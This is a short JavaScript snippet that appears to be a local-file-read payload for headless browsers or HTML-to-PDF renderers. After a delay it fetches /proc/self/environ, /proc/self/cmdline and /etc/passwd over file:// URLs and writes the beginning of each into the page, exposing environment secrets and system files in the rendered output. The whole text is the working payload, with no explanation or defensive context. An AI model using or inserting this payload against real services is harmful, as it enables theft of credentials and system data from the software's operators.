setTimeout(function(){
  var r=document.getElementById('out');
  var out='';
  ['/proc/self/environ','/proc/self/cmdline','/etc/passwd'].forEach(function(p){
    var x=new XMLHttpRequest();
    x.open('GET','file://'+p,false);
    try{x.send();out+=p.split('/').pop()+'='+x.responseText.substring(0,80)+'|';}
    catch(e){out+=p.split('/').pop()+'=E|';}
  });
  r.textContent=out;
},2500);
